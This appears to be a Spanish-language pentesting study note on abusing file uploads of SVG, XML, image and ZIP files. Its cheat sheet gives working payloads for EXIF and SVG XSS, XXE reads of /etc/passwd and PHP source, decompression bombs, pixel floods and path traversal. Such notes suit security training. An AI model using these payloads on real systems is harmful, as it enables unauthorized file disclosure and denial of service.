---
tags:
  - webapp
  - xss
  - ssrf
  - fileupload
---
## Conceptos Clave (TL;DR)

- Incluso si un formulario de subida solo acepta tipos de archivo "seguros" (SVG, HTML, XML, imágenes, documentos), estos pueden contener payloads maliciosos que el servidor o el navegador ejecutarán.
- SVG es XML-based, lo que permite embeber JavaScript (XSS) y entidades XML externas (XXE) directamente en el archivo.
- Los metadatos de imágenes (EXIF) son vectores de XSS si la aplicación los renderiza sin sanitizar en el HTML.
- Los archivos comprimidos (ZIP) y de imagen (JPG/PNG) pueden usarse para DoS si la app los procesa automáticamente (Decompression Bomb / Pixel Flood).

## Herramientas Clave

| Herramienta | Proposito en este vector |
|---|---|
| `exiftool` | Inyectar payloads XSS en campos de metadatos EXIF de imagenes |
| Editor de texto / Burp Suite | Crear/modificar archivos SVG y XML con payloads XXE o XSS |
| `zip` / herramientas de compresion | Construir Decompression Bombs para DoS |
| Herramientas de edicion de imagenes (hex editor) | Manipular datos de compresion para Pixel Flood (JPG/PNG) |


## Metodologia Paso a Paso

### Fase 1 - Reconocimiento de extensiones permitidas

Antes de atacar, fuzzear las extensiones aceptadas por el uploader para mapear la superficie de ataque. Esto determina que vectores son viables (SVG -> XSS/XXE, HTML -> XSS, XML -> XXE, ZIP -> DoS, etc.).

### Fase 2 - XSS via Metadatos EXIF

La app muestra metadatos de la imagen tras la subida. Se inyecta el payload en un campo de texto libre del EXIF (Comment, Artist). El navegador renderiza el valor sin sanitizar y ejecuta el JS.

1. Inyectar payload en el campo `Comment` de la imagen con `exiftool`.
2. Subir la imagen al formulario.
3. Navegar a la URL donde la app muestra los metadatos y verificar que el alert se dispara.

### Fase 3 - XSS via SVG

SVG es XML que el navegador interpreta. Se puede incluir un bloque `<script>` directamente. Si la app sirve el SVG con el Content-Type correcto, el navegador ejecuta el JS.

1. Crear un archivo `.svg` con la estructura XML base y el tag `<script>` con el payload.
2. Subir el archivo SVG.
3. Visitar/ver la imagen para disparar el payload.

### Fase 4 - XXE via SVG (Lectura de archivos)

El parser XML del servidor procesa las entidades externas definidas en el DOCTYPE. Referenciando `file://` o wrappers PHP, se puede exfiltrar contenido del sistema de archivos del servidor.

1. Crear SVG con una entidad externa (`SYSTEM "file:///etc/passwd"`) y referenciarla en el cuerpo del SVG.
2. Subir y visualizar el SVG.
3. El servidor procesa el XML, resuelve la entidad y la renderiza en la respuesta.
4. Para PHP source code, usar el wrapper `php://filter/convert.base64-encode/resource=` y decodificar el resultado en base64.

### Fase 5 - DoS

Explotar el procesamiento automatico de archivos por parte del servidor para agotar recursos.

- **Decompression Bomb**: Si la app descomprime ZIPs automaticamente, subir un ZIP de ZIPs anidados que expanden a multiples Petabytes.
- **Pixel Flood**: Subir una imagen JPG/PNG con dimensiones reales pequeñas pero con los datos de compresion manipulados para indicar un tamaño percibido de ~4 Gigapixels (0xffff x 0xffff). La app intenta alocar toda esa memoria.
- **Archivo sobredimensionado**: Si no hay limite de tamaño, subir un archivo gigante para llenar el disco.
- **Directory Traversal en upload**: Si el nombre de archivo no es sanitizado, intentar subir a rutas como `../../../etc/passwd`.


## Cheat Sheet de Comandos

```bash
# Inyectar payload XSS en el campo Comment del EXIF de una imagen JPG
# -Comment: define el valor del campo. La imagen resultante se sube al target.
exiftool -Comment=' "><img src=1 onerror=alert(window.origin)>' <IMAGE_FILE>.jpg

# Verificar que el payload quedo escrito correctamente en los metadatos
exiftool <IMAGE_FILE>.jpg
```

```xml
<!-- XSS via SVG: guardar como <PAYLOAD>.svg y subir al formulario -->
<!-- El tag <script> es ejecutado por el navegador al renderizar el SVG -->

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg xmlns="http://www.w3.org/2000/svg" version="1.1" width="1" height="1">
    <rect x="1" y="1" width="1" height="1" fill="green" stroke="black" />
    <script type="text/javascript">alert(window.origin);</script>
</svg>
```

```xml
<!-- XXE via SVG: exfiltracion de /etc/passwd -->
<!-- SYSTEM "file://" define una entidad externa que lee del sistema de archivos -->
<!-- &xxe; referencia la entidad e inserta su contenido en la respuesta renderizada -->

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<svg>&xxe;</svg>
```

```xml
<!-- XXE via SVG: leer codigo fuente PHP en base64 -->
<!-- php://filter/convert.base64-encode/resource= es un wrapper que codifica el archivo antes de enviarlo -->
<!-- Reemplazar index.php con el archivo objetivo: config.php, db.php, etc. -->

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=<TARGET_PHP_FILE>"> ]>
<svg>&xxe;</svg>
```

```bash
# Decodificar el contenido base64 retornado por el payload XXE PHP filter
echo '<BASE64_OUTPUT>' | base64 -d
```

```bash
# Crear un ZIP basico como punto de partida para una Decompression Bomb
# La estructura real de una bomb implica ZIPs anidados recursivamente
zip bomb.zip <INNER_ZIP_FILE>
```


## "Gotchas" y Troubleshooting

- **MIME-Type trick**: Si la app no renderiza los metadatos directamente, cambiar el MIME-Type de la imagen a `text/html` puede hacer que el servidor la sirva como documento HTML, disparando el payload XSS sin necesidad de que se muestren los metadatos.
- **XXE Blind**: Si el servidor procesa el XML pero no muestra el output en la respuesta visible, el ataque puede ser ciego (Blind XXE). En ese caso, exfiltrar via out-of-band (OOB) hacia un servidor controlado por el atacante (Burp Collaborator, interactsh).
- **XXE -> SSRF**: La misma primitiva de entidad externa (`SYSTEM "http://..."`) puede usarse para hacer que el servidor realice peticiones HTTP internas, convirtiendo el XXE en un SSRF para enumerar servicios internos o llamar APIs privadas.
- **Prerequisito XXE**: El parser XML del servidor debe tener procesamiento de entidades externas habilitado. Parsers modernos lo deshabilitan por defecto. Si no hay output, el parser puede ser seguro.
- **Prerequisito Pixel Flood**: La vulnerabilidad requiere que la app procese/renderize la imagen en el servidor (e.g., para generar thumbnails). Si solo la almacena, no hay impacto.
- **Directory Traversal en upload**: Solo funciona si el nombre del archivo proporcionado por el usuario se usa directamente en la ruta del sistema de archivos sin sanitizar. Probar con `../`, `..%2F`, `..%252F` como variantes encoded.
- **Archivos Word/PDF/PPT**: Tambien contienen XML interno. Si la app usa un visor vulnerable a XXE y acepta estos formatos, modificar su XML interno puede llevar a un Blind XXE identico al de SVG.
- **Fuzzing de extensiones**: Antes de asumir que un vector no aplica, siempre fuzzear. Una app que bloquea `.php` puede aceptar `.svg` o `.xml`, abriendo estos vectores secundarios.